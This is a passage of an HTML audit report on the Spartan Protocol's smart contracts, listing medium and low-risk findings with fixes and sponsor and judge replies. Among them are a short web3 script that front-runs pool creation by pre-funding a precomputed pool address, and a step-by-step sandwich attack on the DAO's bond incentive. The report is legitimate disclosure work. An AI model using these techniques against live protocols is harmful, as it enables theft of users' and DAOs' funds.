aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/23\">[M-13] Vulnerable Pool initial rate.</a></h2>\n<p><em>Submitted by jonah1005</em></p>\n<p><code>Pool</code> is created in function <code>createPoolADD</code>. The price (rate) of the token is determined in this function. Since the address is deterministic, the attacker can front-run the <code>createPoolADD</code> transaction and sends tokens to Pool’s address. This would make the pool start with an extreme price and create a huge arbitrage space.</p>\n<p>I assume pools would be created by the deployer rather than DAO at the early stage of the protocol.\nIf the deployer calls <code>createPoolADD</code> and <code>addCuratedPool</code> at the same time then an attacker/arbitrager could actually get (huge) profit by doing this.</p>\n<p>Assume that the deployer wants to create a BNB pool at an initial rate of 10000:300 and then make it a curated pool.\nAn arbitrager can send 2700 BNB to the (precomputed) pool address and make iBNB 10x cheaper. The arbitrager can mint the synth at a 10x cheaper price before the price becomes normal.</p>\n<p><code>poolFactory.sol</code> <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L45-L62\">L45-L62</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pre_computed_dai_pool_address</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&#39;0x1007BDBA1BCc3C94e20d57768EF9fc0b1Cc2844b&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">dai</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pre_computed_dai_pool_address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">({</span><span class=\"mtk8\">&#39;from&#39;</span><span class=\"mtk12\">:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">w3</span><span class=\"mtk1\">.</span><span class=\"mtk12\">eth</span><span class=\"mtk1\">.</span><span class=\"mtk12\">accounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]})</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">10000</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">**</span><span class=\"mtk7\">18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">dai</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">base</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool_factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pool_factory</span><span class=\"mtk1\">.</span><span class=\"mtk12\">functions</span><span class=\"mtk1\">.</span><span class=\"mtk11\">createPoolADD</span><span class=\"mtk1\">(</span><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">initial_amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dai</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transact</span><span class=\"mtk1\">()</span></span></span></code></pre>\n<p>Recommend adding:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk11\">iBEP20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">)) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;initial balance should be zero&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In <code>createPoolADD</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/23#issuecomment-885452428\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>Curated pools will only be added once the community feel a pool is deep enough in Liquidity.\nOther safeguard measures are also in place for this scenario which probably weren’t documented well enough.</p>\n</blockquote>\n<h2 id=\"m-14-bondvault-base-incentive-can-be-gamed\" style=\"position:relative;\"><a href=\"#m-14-bondvault-base-incentive-can-be-gamed\" aria-label=\"m 14 bondvault base incentive can be gamed permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/178\">[M-14] BondVault <code>BASE</code> incentive can be gamed</a></h2>\n<p><em>Submitted by cmichel</em></p>\n<p><code>BondVault</code> deposits match <em>any</em> deposited <code>token</code> amount with the <code>BASE</code> amount to provide liquidity, see <a href=\"https://docs.spartanprotocol.org/tokenomics-1/sparta\">Docs</a> and <code>DAO.handleTransferIn</code>.\nThe matched <code>BASE</code> amount is the <strong>swap amount</strong> of the <code>token</code> trade in the pool.\nAn attacker can manipulate the pool and have the <code>DAO</code> commit <code>BASE</code> at bad prices which they then later buys back to receive a profit on <code>BASE</code>. This is essentially a sandwich attack abusing the fact that one can trigger the <code>DAO</code> to provide <code>BASE</code> liquidity at bad prices:</p>\n<ol>\n<li>Manipulate the pool spot price by dripping a lot of <code>BASE</code> into it repeatedly (sending lots of smaller trades is less costly due to the <a href=\"https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools\">path-independence of the continuous liquidity model</a>). This increases the <code>token</code> per <code>BASE</code> price.</li>\n<li>Repeatedly call <code>DAO.bond(amount)</code> to drip <code>tokens</code> into the <code>DAO</code> and get matched with <code>BASE</code> tokens to provide liquidity. (Again, sending lots of smaller trades is less costly.) As the pool contains low <code>token</code> but high <code>BASE</code> reserves, the <code>spartaAllocation = _UTILS.calcSwapValueInBase(_token, _amount)</code> swap value will be high. <strong>The contract sends even more BASE to the pool to provide this liquidity</strong>.</li>\n<li>Unmanipulate the pool by sending back the <code>tokens</code> from 1. As a lot more <code>BASE</code> tokens are in the reserve now due to the DAO sending it, the attacker will receive more <code>BASE</code> as in 1. as well, making a profit</li>\n</ol>\n<p>The DAO’s Bond allocation can be stolen.\nThe cost of the attack is the trade fees in 1. + 3. as well as the tokens used in 2. to match the <code>BASE</code>, but the profit is a share on the <code>BASE</code> supplied to the pool by the DAO in 2.</p>\n<p>Track a TWAP spot price of the <code>TOKEN &#x3C;> BASE</code> pair and check if the <code>BASE</code> incentive is within a range of the TWAP. This circumvents that the <code>DAO</code> commits <code>BASE</code> at bad prices.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/178#issuecomment-885408113\">verifyfirst (Spartan) acknowledged and disagreed with severity</a>:</strong></p>\n<blockquote>\n<p>Implementing a TWAP needs more discussion and ideas to help with price manipulation.\nAttacking BOND is limited by its allocation, time and the fact that it’s locked over 6months.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/178#issuecomment-894864184\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Per sponsor comment making this medium risk</p>\n</blockquote>\n<h2 id=\"m-15-deployer-can-drain-daovault-funds--manipulate-proposal-results\" style=\"position:relative;\"><a href=\"#m-15-deployer-can-drain-daovault-funds--manipulate-proposal-results\" aria-label=\"m 15 deployer can drain daovault funds  manipulate proposal results permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/27\">[M-15] <code>DEPLOYER</code> can drain DAOVault funds + manipulate proposal results</a></h2>\n<p><em>Submitted by hickuphh3</em></p>\n<p>2 conditions enable the <code>DEPLOYER</code> to drain the funds in the <code>DAOVault</code>.</p>\n<ul>\n<li><code>DAOVault</code> is missing <code>purgeDeployer()</code> function</li>\n<li><code>onlyDAO()</code> is callable by both the <code>DAO</code> and the <code>DEPLOYER</code></li>\n</ul>\n<p>The <code>DEPLOYER</code> can, at any time, call <code>depositLP()</code> to increase the LP funds of any account, then call <code>withdraw()</code> to withdraw the entire balance.</p>\n<p>The only good use case for the <code>DEPLOYER</code> here is to help perform emergency withdrawals for users. However, this could use a separate modifier, like <code>onlyDeployer()</code>.</p>\n<ol>\n<li><code>DEPLOYER</code> calls <code>depositLP()</code> with any arbitrary amount (maybe DAOVault’s pool LP balance - Alice’s deposited LP balance) for Alice and pool to increase their weight and balance.</li>\n<li>At this point, Alice may vote for a proposal to swing it in her favour, or remove it otherwise (to implicitly vote against it)</li>\n<li><code>DEPLOYER</code> calls <code>withdraw()</code> for the Alice, which removes 100% of her balance (and therefore, the entire DAOVault’s pool balance)</li>\n<li>Create a separate role and modifier for the <code>DEPLOYER</code>, so that he is only able to call <code>withdraw()</code> but not <code>depositLP()</code></li>\n<li>Include the missing <code>purgeDeployer()</code> function.</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/27#issuecomment-883841672\">verifyfirst (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>We are already aware of the privilege level the deployer holds with returning user funds to user’s wallet.\nWe disagree with the severity of this issue - however, agree it can be used to manipulate user’s weight from a proposal.\nWe will include the purge deployer into the vault to resolve this issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/27#issuecomment-894864608\">ghoul-sol (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Privileged deployer is common in early stage protocols but because of lack of <code>purgeDeployer</code> function, I’ll keep this medium risk.</p>\n</blockquote>\n<h1 id=\"low-risk-35\" style=\"position:relative;\"><a href=\"#low-risk-35\" aria-label=\"low risk 35 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk (35)</h1>\n<h2 id=\"l-01-event-log-poisoning-by-griefing-attackers\" style=\"position:relative;\"><a href=\"#l-01-event-log-poisoning-by-griefing-attackers\" aria-label=\"l 01 event log poisoning by griefing attackers permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/104\">[L-01] Event log poisoning by griefing attackers</a></h2>\n<p>Event log poisoning is possible by griefing attackers who have no DAO weight but vote and emit event that takes up event log space. See <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/\">L382</a> and <a href=\"https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L393\">L393</a> in <code>Dao.sol</code>.</p>\n<p>Recommend emitting event only if non-zero weight as relevant to proposal voting/cancelling.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/104#issuecomment-885517148\">SamusElderg (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Good point; @verifyfirst (Spartan) should we make the event conditional or is it used anywhere when the vote is zeroed out?\nFrom memory when zeroed-out it is simply done via mappings and doesn’t emit an event anyway so probably safe to conditional this one (or remove it if we aren’t using it in any user-facing interface)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/104#issuecomment-886320106\">verifyfirst (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>Yep, a conditional is a good one</p>\n</blockquote>\n<h2 id=\"l-02-attackers-can-grief-voting-by-removing-votes-just-before-finalization\" style=\"position:relative;\"><a href=\"#l-02-attackers-can-grief-voting-by-removing-votes-just-before-finalization\" aria-label=\"l 02 attackers can grief voting by removing votes just before finalization permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/105\">[L-02] Attackers can grief voting by removing votes just before finalization</a></h2>\n<p>Attackers, i.e. malicious DAO members, can grief voting by removing their votes just before finalization and if that takes it below quorum, it forces others to vote and restarts another cooloff period of 3 days. This will delay the finalisation of targeted proposals and the griefing attackers lose nothing in penalty. See issue page for referenced code.</p>\n<p><strong>Recommend</strong>:</p>\n<ol>\n<li>Redesign to allow vote removal only within a certain window after voting and locking it thereafter.</li>\n<li>Removal of votes should have an associated penalty</li>\n</ol>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/105#issuecomment-885518556\">SamusElderg (Spartan) acknowledged</a>:</strong></p>\n<blockquote>\n<p>I don’t agree with locking up voters; as we all know people like to press buttons and sometimes form an opinion later; need to allow them to change their mind (or have their mind changed by good discussion)</p>\n<p>However, a fee/penalty of sorts for removeVote is an interesting discussion point 👍 @verifyfirst (Spartan)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/105#issuecomment-886319389\">verifyfirst (Spartan) commented</a>:</strong></p>\n<blockquote>\n<p>I agree with the suggestion of a removeVote penalty to reduce the unlikely grieving</p>\n</blockquote>\n<h2 id=\"l-03-poolsol-swapto-should-not-be-payable\" style=\"position:relative;\"><a href=\"#l-03-poolsol-swapto-should-not-be-payable\" aria-label=\"l 03 poolsol swapto should not be payable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/46\">[L-03] Pool.sol: <code>swapTo()</code> should not be payable</a></h2>\n<p>The <code>swapTo()</code> function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.</p>\n<p>Furthermore, the <code>swapTo()</code> will not detect any deposited BNB, so any <code>swapTo()</code> calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.</p>\n<p>Recommend removing <code>payable</code> keyword in <code>swapTo()</code>.</p>\n<h2 id=\"l-04-incorrect-event-parameter-used-in-emit\" style=\"position:relative;\"><a href=\"#l-04-incorrect-event-parameter-used-in-emit\" aria-label=\"l 04 incorrect event parameter used in emit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/119\">[L-04] Incorrect event parameter used in emit</a></h2>\n<p>Incorrect event parameter <code>outputAmount</code> is used (instead of output) in the MintSynth event emit. <code>outputAmount</code> is a named return variable that is never set in this function and so will always be 0. This should instead be output. This will confuse the UI or offchain monitoring tools that 0 synths were minted and will lead to users panicking/complaining or trying to mint synth again.</p>\n<p>Recommend replacing <code>outputAmount</code> with output in the emit.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/119#issuecomment-886317197\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Code needs refactoring</p>\n</blockquote>\n<h2 id=\"l-05-missing-check-for-topool--frompool\" style=\"position:relative;\"><a href=\"#l-05-missing-check-for-topool--frompool\" aria-label=\"l 05 missing check for topool  frompool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/127\">[L-05] Missing check for <code>toPool != fromPool</code></a></h2>\n<p><code>zapLiquidity()</code> used to trade LP tokens of one pool to another is missing a check for toPool != fromPool which may happen accidentally. The check will prevent unnecessary transfers and avoid any fees/slippage or accounting errors.</p>\n<p>Recommend adding <code>toPool</code> != <code>fromPool</code> as part of input validation.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/127#issuecomment-886314691\">verifyfirst (Spartan) confirmed</a>:</strong></p>\n<blockquote>\n<p>Although very low risk, recommended mitigation is valid</p>\n</blockquote>\n<h2 id=\"l-06-unnecessary-redundant-check-for-basispoints\" style=\"position:relative;\"><a href=\"#l-06-unnecessary-redundant-check-for-basispoints\" aria-label=\"l 06 unnecessary redundant check for basispoints permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/129\">[L-06] Unnecessary redundant check for <code>basisPoints</code></a></h2>\n<p>The threshold check for <code>basisPoints</code> while a required part of input validation is an unnecessary redundant check because <code>calcPart()</code> does a similar upper bound check and the lower bound check on 0 is only an optimization.</p>\n<p>Recommend removing redundant check to save gas and improve readability/maintainability.</p>\n<h2 id=\"l-07-missing-islistedpool-checks-may-lead-to-lockloss-of-user-funds\" style=\"position:relative;\"><a href=\"#l-07-missing-islistedpool-checks-may-lead-to-lockloss-of-user-funds\" aria-label=\"l 07 missing islistedpool checks may lead to lockloss of user funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/130\">[L-07] Missing <code>isListedPool</code> checks may lead to lock/loss of user funds</a></h2>\n<p>This <code>isListedPool</code> check implemented by <code>isPool()</code> is missing in many functions of the contract that accept pool/token addresses from users. <code>getPool()</code> returns the default mapping value of 0 for token that do not have valid pools. This lack of input validation may lead to use of zero/invalid pool addresses in the protocol context and reverts in the best case or burn/loss of user funds in the worst case.</p>\n<p>Recommend combine <code>isPool()</code> <code>isListedPool</code> check to <code>getPool()</code> so that it always returns a valid/listed pool in the protocol.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/130#issuecomment-886314162\">verifyfirst (Spartan) acknowledged and confirmed</a>:</strong></p>\n<blockquote>\n<p>Code can be cleaner</p>\n</blockquote>\n<h2 id=\"l-08-number-of-curated-pools-can-only-be-10-at-any-point\" style=\"position:relative;\"><a href=\"#l-08-number-of-curated-pools-can-only-be-10-at-any-point\" aria-label=\"l 08 number of curated pools can only be 10 at any point permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/134\">[L-08] Number of curated pools can only be 10 at any point</a></h2>\n<p>Without a setter for curatedPoolSize, the number of curated pools at any point can only be a max of 10 forever, and will require removing one to accommodate another one. It is unclear if this is intentional and a requirement of the protocol.</p>\n<p>Recommend a setter for <code>curatedPoolSize</code> that allows DAO to increase it if/when required. If not, document the hardcoded limit of curated pools number.</p>\n<h2 id=\"l-09-incorrect-event-parameter-logs-zero-address-instead-of-wbnb\" style=\"position:relative;\"><a href=\"#l-09-incorrect-event-parameter-logs-zero-address-instead-of-wbnb\" aria-label=\"l 09 incorrect event parameter logs zero address instead of wbnb permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/135\">[L-09] Incorrect event parameter logs zero address instead of WBNB</a></h2>\n<p>The token argument used in <code>CreatePool</code> event emit of <code>createPoolADD()</code> should really be _token so that WBNB address is logged in the event instead of zero address when token == 0. Logging a zero address could confuse off-chain user interfaces because it is treated as a burn address by convention.</p>\n<p>Recommend using _token instead of token in event emit.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-07-spartan-findings/issues/135#issuecomment-886561822\">SamusElderg (Spartan) 